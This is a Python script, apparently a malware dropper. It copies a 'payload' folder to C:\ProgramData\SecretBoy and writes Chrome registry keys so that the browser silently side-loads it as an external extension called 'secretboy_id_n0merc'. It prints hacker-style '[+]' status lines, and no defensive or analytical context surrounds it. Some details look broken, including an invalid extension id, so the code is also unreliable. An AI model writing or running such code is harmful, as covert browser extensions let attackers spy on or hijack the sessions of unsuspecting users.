import os
import shutil
import winreg
import sys

appdata = os.getenv('LOCALAPPDATA')
target_dir = os.path.join(appdata, 'Google', 'Chrome', 'User Data', 'External Extensions')
extension_id = "secretboy_id_n0merc" 
extension_path = os.path.join(target_dir, f"{extension_id}.json")

def install_extension():
    try:
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)

        payload_path = "C:\\ProgramData\\SecretBoy"
        if os.path.exists(payload_path):
            shutil.rmtree(payload_path)
        
        shutil.copytree("extension_files", payload_path)

        reg_path = r"Software\Google\Chrome\Extensions\\" + extension_id
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            winreg.SetValueEx(key, "path", 0, winreg.REG_SZ, os.path.join(payload_path, "manifest.json"))
            winreg.SetValueEx(key, "version", 0, winreg.REG_SZ, "1.2")
            winreg.CloseKey(key)
            print("[+] Registry key added successfully.")
        except Exception as e:
            print(f"[-] Registry error: {e}")

    except Exception as e:
        print(f"[-] Installation failed: {e}")

if __name__ == "__main__":
    install_extension()